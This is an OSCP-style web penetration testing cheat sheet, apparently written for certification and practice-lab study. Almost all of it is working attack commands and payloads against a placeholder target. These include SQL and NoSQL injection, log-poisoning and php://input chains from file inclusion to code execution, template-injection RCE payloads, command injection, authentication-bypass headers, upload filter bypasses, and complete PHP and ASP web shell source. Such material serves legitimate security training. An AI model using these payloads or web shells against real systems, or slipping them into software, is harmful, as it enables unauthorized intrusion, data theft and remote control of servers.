# OSCP Enhanced Web Application Testing Guide

## Table of Contents
- [Initial Web Discovery](#initial-web-discovery)
- [Manual Testing Mastery](#manual-testing-mastery)
- [Advanced Vulnerability Testing](#advanced-vulnerability-testing)
- [API Security Testing](#api-security-testing)
- [Authentication Bypass Techniques](#authentication-bypass-techniques)
- [File Upload Exploitation](#file-upload-exploitation)
- [TJ Null Specific Scenarios](#tj-null-specific-scenarios)

## Initial Web Discovery

### Technology Fingerprinting (Multi-Method Approach)
```bash
# Basic fingerprinting
whatweb http://<target>
whatweb https://<target>

# WAF detection
wafw00f http://<target>

# Technology detection through headers
curl -I http://<target>
curl -I https://<target>

# Check for specific technologies
curl -s http://<target> | grep -i "generator\|powered\|built\|version\|framework"

# User-agent variations
curl -H "User-Agent: Mozilla/5.0" http://<target>
curl -H "User-Agent: Googlebot" http://<target>
```

### HTTP Methods Testing (Complete Coverage)
```bash
# Test all HTTP methods
for method in GET POST PUT DELETE PATCH OPTIONS HEAD TRACE TRACK CONNECT; do
  echo "Testing $method:"
  curl -X $method http://<target>/ -v -s 2>&1 | head -5
done

# Test dangerous methods with content
curl -X PUT http://<target>/test.txt -d "test content" -v
curl -X DELETE http://<target>/test.txt -v
curl -X PATCH http://<target>/api/users/1 -d '{"admin":true}' -H "Content-Type: application/json"
```

### SSL/TLS Deep Analysis
```bash
# Comprehensive SSL scanning
sslscan <target>:443
sslyze --regular <target>:443

# Certificate analysis
openssl s_client -connect <target>:443 -servername <target>

# Check for SSL vulnerabilities
nmap --script ssl-* <target> -p 443

# Test for weak ciphers
nmap --script ssl-enum-ciphers <target> -p 443
```

## Manual Testing Mastery

### Source Code Analysis Patterns
```bash
# Download entire site for offline analysis
wget -r -np -nH --cut-dirs=3 -R index.html* http://<target>/

# Search for sensitive patterns
grep -r -i "password\|admin\|config\|key\|secret\|token\|api" /path/to/downloaded/site/

# JavaScript analysis
find . -name "*.js" -exec grep -l -i "password\|admin\|api\|key\|token\|endpoint" {} \;

# Check for exposed configuration files
curl -s http://<target>/config.js | jq .
curl -s http://<target>/app.config | head -20
curl -s http://<target>/package.json | jq .
```

### Advanced Directory Discovery
```bash
# Technology-specific wordlists
# PHP applications
gobuster dir -u http://<target> -w /usr/share/seclists/Discovery/Web-Content/PHP.fuzz.txt -x php,phtml,php3,php5,inc

# ASP.NET applications
gobuster dir -u http://<target> -w /usr/share/seclists/Discovery/Web-Content/IIS.fuzz.txt -x asp,aspx,ashx,asmx,config

# Java applications  
gobuster dir -u http://<target> -w /usr/share/seclists/Discovery/Web-Content/CMS/tomcat.fuzz.txt -x jsp,do,action

# Common CMS detection and enumeration
# WordPress
wpscan --url http://<target> --enumerate ap,at,tt,cb,dbe,u,m --api-token <token>

# Drupal
droopescan scan drupal -u http://<target>

# Joomla
joomscan -u http://<target>
```

### Parameter Discovery and Fuzzing
```bash
# GET parameter fuzzing
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
     -u "http://<target>/page.php?FUZZ=test" -fs 1234 -t 100

# POST parameter fuzzing
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
     -u http://<target>/login.php -X POST -d "FUZZ=test" \
     -H "Content-Type: application/x-www-form-urlencoded" -fs 1234

# Header parameter fuzzing
ffuf -w /usr/share/seclists/Discovery/Web-Content/BurpSuite-ParamNames.txt \
     -u http://<target> -H "FUZZ: test" -fs 1234

# JSON parameter fuzzing
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
     -u http://<target>/api/login -X POST \
     -d '{"FUZZ":"test"}' -H "Content-Type: application/json" -fs 1234
```

## Advanced Vulnerability Testing

### SQL Injection Mastery (Beyond SQLMap)

#### Manual SQL Injection Testing
```bash
# Basic error-based detection
curl "http://<target>/page.php?id=1'" 
curl "http://<target>/page.php?id=1\""
curl "http://<target>/page.php?id=1\\"

# Union-based injection discovery
curl "http://<target>/page.php?id=1 UNION SELECT 1--"
curl "http://<target>/page.php?id=1 UNION SELECT 1,2--"
curl "http://<target>/page.php?id=1 UNION SELECT 1,2,3--"

# Boolean-based blind testing
curl "http://<target>/page.php?id=1 AND 1=1--"
curl "http://<target>/page.php?id=1 AND 1=2--"

# Time-based blind testing
curl "http://<target>/page.php?id=1 AND SLEEP(5)--"
curl "http://<target>/page.php?id=1'; WAITFOR DELAY '0:0:5'--"
```

#### POST Data SQL Injection
```bash
# Login form testing
curl -X POST http://<target>/login.php \
     -d "username=admin' OR '1'='1'--&password=anything"

# JSON payload testing  
curl -X POST http://<target>/api/login \
     -H "Content-Type: application/json" \
     -d '{"username":"admin'\'' OR '\''1'\''='\''1'\''--","password":"test"}'
```

### Local File Inclusion (LFI) to RCE Chains

#### Basic LFI Testing
```bash
# Linux LFI payloads
curl "http://<target>/page.php?file=../../../etc/passwd"
curl "http://<target>/page.php?file=....//....//....//etc/passwd"
curl "http://<target>/page.php?file=/etc/passwd%00"

# Windows LFI payloads
curl "http://<target>/page.php?file=../../../windows/system32/drivers/etc/hosts"
curl "http://<target>/page.php?file=C:\\windows\\system32\\drivers\\etc\\hosts"
```

#### LFI to RCE Techniques
```bash
# Log poisoning via SSH
# 1. Include SSH log
curl "http://<target>/page.php?file=/var/log/auth.log"

# 2. Poison SSH log (from another terminal)
ssh "<?php system(\$_GET['c']); ?>"@<target>

# 3. Execute commands
curl "http://<target>/page.php?file=/var/log/auth.log&c=whoami"

# Apache log poisoning
# 1. Include Apache access log
curl "http://<target>/page.php?file=/var/log/apache2/access.log"

# 2. Poison log with PHP code in User-Agent
curl -A "<?php system(\$_GET['c']); ?>" http://<target>

# 3. Execute commands
curl "http://<target>/page.php?file=/var/log/apache2/access.log&c=id"

# PHP wrapper exploitation
curl -X POST "http://<target>/page.php?file=php://input" \
     -d "<?php system(\$_GET['c']); ?>" \
     -H "Content-Type: application/x-www-form-urlencoded"

# Then execute: curl "http://<target>/page.php?file=php://input&c=whoami"
```

### Server-Side Template Injection (SSTI)

#### SSTI Detection
```bash
# Basic SSTI payloads
curl "http://<target>/page.php?name={{7*7}}"
curl "http://<target>/page.php?name=\${7*7}"
curl "http://<target>/page.php?name=<%= 7*7 %>"
curl "http://<target>/page.php?name=\${{7*7}}"
curl "http://<target>/page.php?name=#{7*7}"

# Template engine identification
# Jinja2 (Python)
curl "http://<target>/?name={{config}}"
curl "http://<target>/?name={{''.__class__.__mro__[2].__subclasses__()}}"

# Twig (PHP)
curl "http://<target>/?name={{_self}}"
curl "http://<target>/?name={{dump(app)}}"
```

#### SSTI Exploitation
```bash
# Jinja2 RCE
payload="{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}"
curl "http://<target>/?name=$payload"

# Twig RCE  
payload="{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"whoami\")}}"
curl "http://<target>/?name=$payload"
```

### Command Injection Mastery
```bash
# Basic command injection payloads
curl "http://<target>/ping.php?ip=127.0.0.1;id"
curl "http://<target>/ping.php?ip=127.0.0.1|id"
curl "http://<target>/ping.php?ip=127.0.0.1&&id"
curl "http://<target>/ping.php?ip=127.0.0.1\`id\`"
curl "http://<target>/ping.php?ip=127.0.0.1\$(id)"

# URL encoded payloads
curl "http://<target>/ping.php?ip=127.0.0.1%3Bid"
curl "http://<target>/ping.php?ip=127.0.0.1%7Cid"

# Time-based blind command injection
curl "http://<target>/ping.php?ip=127.0.0.1;sleep 10"
curl "http://<target>/ping.php?ip=127.0.0.1|sleep 10"

# Output redirection for blind injection
curl "http://<target>/ping.php?ip=127.0.0.1;whoami > /tmp/output.txt"
curl "http://<target>/ping.php?ip=127.0.0.1;cat /tmp/output.txt"
```

## API Security Testing

### API Discovery Techniques
```bash
# Common API paths discovery
for path in api v1 v2 v3 api/v1 api/v2 api/v3 rest graphql; do
  echo "Testing /$path:"
  curl -s http://<target>/$path/ | head -5
done

# API documentation discovery
for doc in api-docs swagger.json openapi.json docs api/docs redoc; do
  curl -s http://<target>/$doc | head -10
done

# GraphQL introspection
curl -X POST http://<target>/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"{__schema{types{name}}}"}'

# GraphQL endpoint discovery
for endpoint in graphql api/graphql v1/graphql; do
  curl -X POST http://<target>/$endpoint \
       -H "Content-Type: application/json" \
       -d '{"query":"{ __typename }"}'
done
```

### REST API Testing
```bash
# Test all HTTP methods on API endpoints
for method in GET POST PUT DELETE PATCH OPTIONS; do
  echo "Testing $method on /api/users:"
  curl -X $method http://<target>/api/users -v
done

# IDOR testing
curl http://<target>/api/users/1
curl http://<target>/api/users/2  
curl http://<target>/api/users/100

# Mass assignment testing
curl -X POST http://<target>/api/users \
     -H "Content-Type: application/json" \
     -d '{"username":"test","password":"test","role":"admin","is_admin":true}'

# Parameter pollution
curl "http://<target>/api/users?id=1&id=2"
curl "http://<target>/api/users?role=user&role=admin"
```

## Authentication Bypass Techniques

### SQL Authentication Bypass
```sql
-- Login bypass payloads
admin'--
admin'/*
' OR '1'='1'--
' OR 1=1--
admin' OR '1'='1'--
'OR 1=1#
' UNION SELECT 1,'admin','password'--
```

### NoSQL Injection for Authentication Bypass
```bash
# MongoDB injection
curl -X POST http://<target>/login \
     -H "Content-Type: application/json" \
     -d '{"username":{"$ne":""},"password":{"$ne":""}}'

curl -X POST http://<target>/login \
     -H "Content-Type: application/json" \
     -d '{"username":"admin","password":{"$regex":".*"}}'
```

### HTTP Header Authentication Bypass
```bash
# Test bypass headers
curl -H "X-Forwarded-For: 127.0.0.1" http://<target>/admin
curl -H "X-Real-IP: 127.0.0.1" http://<target>/admin
curl -H "X-Originating-IP: 127.0.0.1" http://<target>/admin
curl -H "X-Remote-IP: 127.0.0.1" http://<target>/admin
curl -H "X-Remote-Addr: 127.0.0.1" http://<target>/admin

# Authorization header manipulation
curl -H "Authorization: Bearer admin" http://<target>/api/admin
curl -H "X-User-ID: 1" http://<target>/profile
curl -H "X-Role: admin" http://<target>/admin
```

## File Upload Exploitation

### File Upload Bypass Techniques
```bash
# Extension bypasses
# Double extension
shell.php.jpg
shell.asp.png

# Null byte (older systems)
shell.php%00.jpg
shell.asp%00.gif

# Case variations
shell.PHP
shell.AsP
shell.pHp

# Alternative extensions
shell.php5
shell.phtml
shell.inc
shell.phar

# Content-Type manipulation
# Upload with image content-type but PHP content
curl -X POST http://<target>/upload.php \
     -F "file=@shell.php;type=image/jpeg"
```

### Web Shell Creation
```php
<?php
// Minimal PHP web shell
if(isset($_GET['c'])) {
    system($_GET['c']);
}
?>
```

```php
<?php
// Advanced PHP web shell with form
if(isset($_REQUEST['cmd'])) {
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
} else {
    echo '<form method="post"><input type="text" name="cmd" /><input type="submit" value="Execute" /></form>';
}
?>
```

```asp
<%
' Basic ASP web shell
If Request.QueryString("cmd") <> "" Then
    Set oExec = Server.CreateObject("WScript.Shell").Exec(Request.QueryString("cmd"))
    Response.Write("<pre>" & Server.HTMLEncode(oExec.StdOut.ReadAll()) & "</pre>")
End If
%>
```

## TJ Null Specific Scenarios

### Common TJ Null Box Patterns

#### Pattern 1: Simple Web App + Basic PrivEsc
```bash
# Usually involves:
# 1. Directory enumeration to find admin panel
gobuster dir -u http://<target> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# 2. Default credentials or SQL injection
curl -X POST http://<target>/admin/login.php -d "username=admin&password=admin"

# 3. File upload to get shell
# Upload PHP shell, then access via:
curl "http://<target>/uploads/shell.php?c=whoami"
```

#### Pattern 2: LFI to RCE Chain
```bash
# 1. Find LFI vulnerability
curl "http://<target>/page.php?file=../../../etc/passwd"

# 2. Poison logs (common in TJ Null boxes)
curl -A "<?php system(\$_GET['c']); ?>" http://<target>

# 3. Include poisoned log
curl "http://<target>/page.php?file=/var/log/apache2/access.log&c=id"
```

#### Pattern 3: Service Exploitation + Windows PrivEsc
```bash
# 1. Service enumeration
nmap -sV <target>

# 2. Searchsploit for specific service version
searchsploit service_name version

# 3. Exploit execution
python3 exploit.py <target>

# 4. Windows privilege escalation (common techniques in TJ Null)
# - Check for unquoted service paths
# - Look for AlwaysInstallElevated
# - Token impersonation with JuicyPotato
```

### TJ Null Box Difficulty Patterns

#### Easy Box Checklist:
- [ ] Basic directory enumeration reveals admin panel
- [ ] Default credentials work (admin:admin, admin:password)
- [ ] Simple file upload vulnerability
- [ ] Obvious SUID binary or sudo misconfiguration
- [ ] Clear privilege escalation path

#### Medium Box Checklist:
- [ ] Requires custom wordlists or deeper enumeration
- [ ] Chained vulnerabilities (LFI + log poisoning)
- [ ] Service-specific exploits requiring modification
- [ ] Multiple privilege escalation vectors to try
- [ ] Some rabbit holes but clear main path

#### Hard Box Checklist:
- [ ] Advanced enumeration techniques required
- [ ] Custom exploit development needed
- [ ] Complex privilege escalation chains
- [ ] Multiple services interaction required
- [ ] Significant time investment needed

### Common TJ Null Enumeration Mistakes

#### Mistake 1: Not Checking All Extensions
```bash
# Wrong: Only checking common extensions
gobuster dir -u http://<target> -w wordlist.txt -x php,html

# Correct: Check technology-specific extensions  
gobuster dir -u http://<target> -w wordlist.txt -x php,phtml,php3,php5,inc,html,htm,js,txt,bak
```

#### Mistake 2: Missing Backup Files
```bash
# Always check for backup files of discovered pages
for file in index.php admin.php login.php config.php; do
  for ext in .bak .backup .old .orig .save .tmp; do
    curl -s -I http://<target>/$file$ext | grep -q "200 OK" && echo "Found: $file$ext"
  done
done
```

#### Mistake 3: Not Following Error Messages
```bash
# Pay attention to error messages - they reveal technology and paths
curl "http://<target>/nonexistent.php" 2>&1 | grep -i "error\|warning\|notice"
```

## Quick Reference Commands

### One-Liner Web Enumeration
```bash
# Rapid web discovery
gobuster dir -u http://<target> -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -x php,html,txt -t 50 -q --no-error
```

### One-Liner Parameter Testing
```bash
# Quick parameter discovery  
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u "http://<target>/?FUZZ=test" -fs 1234 -s
```

### One-Liner SQL Injection Test
```bash
# Quick SQLi test
for payload in "'" "\"" "\\" "1' OR '1'='1'--"; do echo "Testing: $payload"; curl -s "http://<target>/login?id=$payload" | wc -c; done
```

Remember: Web application testing in OSCP is about methodical enumeration and understanding common patterns. Don't just run tools - understand what they're doing and adapt your approach based on the technology stack you discover!